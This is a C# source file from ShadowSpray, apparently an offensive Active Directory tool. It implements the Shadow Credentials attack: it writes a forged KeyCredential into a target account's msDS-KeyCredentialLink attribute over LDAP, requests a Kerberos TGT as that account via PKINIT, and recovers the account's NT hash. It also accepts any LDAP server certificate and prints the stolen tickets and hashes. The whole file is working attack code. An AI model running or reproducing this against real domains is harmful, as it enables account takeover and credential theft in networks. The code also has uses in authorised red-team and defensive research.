using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using DSInternals.Common.Data;
using ShadowSpray.Kerb;
using static ShadowSpray.Natives;

namespace ShadowSpray
{
    struct ShadowCredObject
    {
        public string samAccountName { get; set; }
        public string keyCred { get; set; }
        public string keyCredPassword { get; set; }
        public KRB_CRED TGT { get; set; }
        public string NTHash { get; set; }
    }

    class ShadowCred
    {
        IntPtr ldapConnection = IntPtr.Zero;
        public List<ShadowCredObject> shadowCredObjects = new List<ShadowCredObject>();
        LDAP_TIMEVAL timeout;
        IntPtr attrs;
        IntPtr controlPtr;
        IntPtr ber;
        KeyCredential defaultKeyCredential;

        public bool ConnectToLDAP(KRB_CRED TGT = null, string username = null, string password = null)
        {
            if (!String.IsNullOrEmpty(username) && !String.IsNullOrEmpty(password))
            {
                string salt = String.Format("{0}{1}", Options.domain.ToUpper(), username);

                // special case for computer account salts
                if (username.EndsWith("$"))
                {
                    salt = String.Format("{0}host{1}.{2}", Options.domain.ToUpper(), username.TrimEnd('$').ToLower(), Options.domain.ToLower());
                }

                string hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, password, salt);
                
                byte[] bInnerTGT = AskTGT.TGT(userName: username, domain: Options.domain, hash, Interop.KERB_ETYPE.aes256_cts_hmac_sha1, outfile: null, ptt: false, out string nthash, domainController: Options.domainController);
                TGT = new KRB_CRED(bInnerTGT);
            }

            if (TGT != null)
            {
                AskTGT.TGS(TGT, $"LDAP/{Options.domainController}", domainController: Options.domainController, ptt: true);
            }

            var timeout = new LDAP_TIMEVAL
            {
                tv_sec = (int)(new TimeSpan(0, 0, 60).Ticks / TimeSpan.TicksPerSecond)
            };

            ldapConnection = ldap_init(Options.domainController, (uint)Options.ldapPort);

            uint LDAP_OPT_ON = 1;
            uint LDAP_OPT_OFF = 1;
            uint version = 3;
            var ldapStatus = ldap_set_option(ldapConnection, 0x11, ref version);

            if (Options.useSSL)
            {
                ldap_get_option(ldapConnection, 0x0a, out int lv);  //LDAP_OPT_SSL
                if (lv == 0)
                    ldap_set_option(ldapConnection, 0x0a, ref LDAP_OPT_ON);

                ldap_get_option(ldapConnection, 0x0095, out lv);  //LDAP_OPT_SIGN
                if (lv == 0)
                    ldap_set_option(ldapConnection, 0x0095, ref LDAP_OPT_ON);

                ldap_get_option(ldapConnection, 0x0096, out lv);  //LDAP_OPT_ENCRYPT
                if (lv == 0)
                    ldap_set_option(ldapConnection, 0x0096, ref LDAP_OPT_ON);

                ldap_set_option(ldapConnection, 0x81, Marshal.GetFunctionPointerForDelegate<VERIFYSERVERCERT>((connection, serverCert) => true));
            }

            ldapStatus = ldap_connect(ldapConnection, timeout);
            if (ldapStatus != 0)
            {
                Console.WriteLine("[-] Could not connect to {0}. ldap_connect failed with error code 0x{1}", Options.domainController, ldapStatus.ToString("x2"));
                return false;
            }

            ldap_bind_s(ldapConnection, null, null, 0x86 | 0x0400);

            ldap_get_option(ldapConnection, 0x0031, out int value);

            if ((LdapStatus)value == LdapStatus.LDAP_SUCCESS)
            {
                if (String.IsNullOrEmpty(username))
                    Console.WriteLine("\n[+] LDAP session established\n");
                else
                    Console.WriteLine($"\n[+] LDAP session established as {username}\n");
            }
            else
            {
                Console.WriteLine($"[-] LDAP connection failed: {(LdapStatus)value}");
                return false;
            }

            return true;
        }

        public void GenerateDefaultKeyCred()
        {
            if (Options.verbose)
                Console.WriteLine("[+] Generating certificate");

            X509Certificate2 cert = GenerateSelfSignedCert("ShadowSpray");
            if (Options.verbose)
            {
                Console.WriteLine("[+] Certificate generated");
                Console.WriteLine("[+] Generating KeyCredential");
            }
            Guid guid = Guid.NewGuid();
            defaultKeyCredential = new KeyCredential(cert, guid, $"CN=ShadowSpray,{Options.domainDN}", DateTime.Now);
            if (Options.verbose)
                Console.WriteLine("[+] KeyCredential generated with DeviceID {0}", guid.ToString());
        }

        public string attack(string targetName, string targetDN)
        {
            string msg = "";

            LdapStatus ret = Ldap.addAttribute(ldapConnection, "msDS-KeyCredentialLink", Encoding.ASCII.GetBytes(defaultKeyCredential.ToDNWithBinary()), targetDN);
            if (ret != LdapStatus.LDAP_CONSTRAINT_VIOLATION)
            {
                throw new Exception(ret.ToString());
            }

            if (Options.verbose)
                Console.WriteLine("[+] Generating certificate");

            X509Certificate2 cert = GenerateSelfSignedCert(targetName);
            if (Options.verbose)
            {
                Console.WriteLine("[+] Certificate generated");
                Console.WriteLine("[+] Generating KeyCredential");
            }
            Guid guid = Guid.NewGuid();
            KeyCredential keyCredential = new KeyCredential(cert, guid, targetDN, DateTime.Now);
            if (Options.verbose)
                Console.WriteLine("[+] KeyCredential generated with DeviceID {0}", guid.ToString());
            
            ret = Ldap.addAttribute(ldapConnection, "msDS-KeyCredentialLink", Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary()), targetDN);

            if (ret != LdapStatus.LDAP_SUCCESS)
                throw new Exception(ret.ToString());

            if (Options.verbose)
                Console.WriteLine("[+] KeyCredential added successfully");

            Options.shadowCredCertificatePassword = Helpers.RandomPasswordGenerator(12);
            byte[] certBytes = cert.Export(X509ContentType.Pfx, Options.shadowCredCertificatePassword);
            string shadowCredCertificate = Convert.ToBase64String(certBytes);
            
            if (Options.verbose)
            {
                Console.WriteLine($"[+] Certificate: {shadowCredCertificate}");
                Console.WriteLine($"[+] Certificate Password: {Options.shadowCredCertificatePassword}");
            }

            //System.Threading.Thread.Sleep(3000);
            
            byte[] bInnerTGT = AskTGT.TGT(targetName, Options.domain, shadowCredCertificate, Options.shadowCredCertificatePassword, Interop.KERB_ETYPE.aes256_cts_hmac_sha1, outfile: null, ptt: false, out string nthash, getCredentials: true, domainController: Options.domainController);
            KRB_CRED TGT = new KRB_CRED(bInnerTGT);

            shadowCredObjects.Add(new ShadowCredObject { samAccountName = targetName, keyCred = shadowCredCertificate, keyCredPassword = Options.shadowCredCertificatePassword, TGT = TGT, NTHash = nthash });
            
            msg = $"[+] {shadowCredObjects.Last().samAccountName}: {shadowCredObjects.Last().NTHash}";

            if (Options.verbose)
                Console.WriteLine($"\n[+] VERBOSE: Base64 TGT for {shadowCredObjects.Last().samAccountName}:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");

            if (Options.shadowCredRestore)
            {
                try
                {
                    ret = Ldap.removeAttribute(ldapConnection, "msDS-KeyCredentialLink", Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary()), targetDN);
                    if (ret != LdapStatus.LDAP_SUCCESS)
                        throw new Exception(ret.ToString());
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Could not restore attribute: {0}", e.Message);
                    Console.ReadKey();
                }
            }
            

            return msg;
        }

        //Code taken from https://stackoverflow.com/questions/13806299/how-can-i-create-a-self-signed-certificate-using-c
        static X509Certificate2 GenerateSelfSignedCert(string cn)
        {
            RSA rsa = new RSACryptoServiceProvider(2048, new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString()));
            CertificateRequest req = new CertificateRequest($"cn={cn}", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            return cert;
        }

        public void Prepare()
        {
            timeout = new Natives.LDAP_TIMEVAL
            {
                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
            };
            attrs = Helpers.AllocHGlobalIntPtrArray(1 + 1);
            controlPtr = Marshal.StringToHGlobalUni("msDS-KeyCredentialLink");
            Marshal.WriteIntPtr(attrs, IntPtr.Size * 0, controlPtr);
            ber = Marshal.AllocHGlobal(IntPtr.Size);
            GenerateDefaultKeyCred();
        }

        public List<byte[]> ReadShadowCredentials(string targetName, string targetDN)
        {
            List<byte[]> attr = new List<byte[]>();
            

            int search = 0;

            search = Natives.ldap_search(ldapConnection, $"{targetDN}", (int)LdapSearchScope.LDAP_SCOPE_SUBTREE, String.Format("(&(sAMAccountName={0}))", targetName), attrs, 0);

            IntPtr pMessage = IntPtr.Zero;
            var r = Natives.ldap_result(ldapConnection, search, 1, timeout, ref pMessage);
            Dictionary<string, Dictionary<string, List<byte[]>>> result = new Dictionary<string, Dictionary<string, List<byte[]>>>();
            var entry = Natives.ldap_first_entry(ldapConnection, pMessage);
            Dictionary<string, List<byte[]>> aa = Ldap.GetLdapAttributes(ldapConnection, entry, ref ber);
            byte[] totalKeyCreds = aa.Values.SelectMany(a => a).ToArray().SelectMany(a => a).ToArray();

            string[] temp = Encoding.ASCII.GetString(totalKeyCreds).Split(new string[] { "B:828:" }, StringSplitOptions.None);
            for (int i = 1; i < temp.Length; i++)
                attr.Add(Encoding.ASCII.GetBytes("B:828:" + temp[i]));

            return attr;
        }
       
    }
}
